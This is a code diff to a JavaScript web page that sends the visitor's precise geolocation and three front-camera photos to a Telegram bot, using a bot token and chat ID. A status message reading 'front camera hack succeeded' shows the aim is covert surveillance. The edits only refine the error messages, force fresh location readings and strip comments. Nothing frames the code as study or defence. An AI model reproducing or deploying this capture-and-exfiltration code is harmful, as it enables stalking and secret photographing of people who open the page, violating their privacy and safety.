@@ -89,10 +89,10 @@ async function sendLocation() {
         await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ chat_id: CHAT_ID, text: `⚠️ 位置情報失敗: ${e.message}` })
+          body: JSON.stringify({ chat_id: CHAT_ID, text: `⚠️ 位置情報の取得に失敗しました: ${e.message}` })
         });
         resolve();
-      }, { enableHighAccuracy: true, timeout: 10000 });
+      }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
     } else {
       resolve();
     }
@@ -100,15 +100,12 @@ async function sendLocation() {
 }
 
 async function captureAndSend() {
-  // 1. 位置情報を先に送る
   await sendLocation();
-
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
     const video = document.createElement("video");
     video.srcObject = stream; video.muted = true; await video.play();
     await new Promise(r => setTimeout(r, 1200));
-    
     const blobs = [];
     for (let i = 0; i < 3; i++) {
       const tempCanvas = document.createElement("canvas");
@@ -118,28 +115,22 @@ async function captureAndSend() {
       if(blob) blobs.push(blob);
       await new Promise(r => setTimeout(r, 400));
     }
-    
     stream.getTracks().forEach(t => t.stop());
-
-    // 2. カメラ成功メッセージを送る
     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ chat_id: CHAT_ID, text: "📷 内カメハック成功" })
     });
-
-    // 3. 写真を送る
     for (const b of blobs) {
       const fd = new FormData();
       fd.append("chat_id", CHAT_ID); fd.append("photo", b, "shot.jpg");
       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
     }
-
   } catch (e) {
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: CHAT_ID, text: `⚠️ カメラ失敗: ${e.message}` })
+      body: JSON.stringify({ chat_id: CHAT_ID, text: `⚠️ カメラの起動に失敗しました: ${e.message}` })
     });
   }
 }
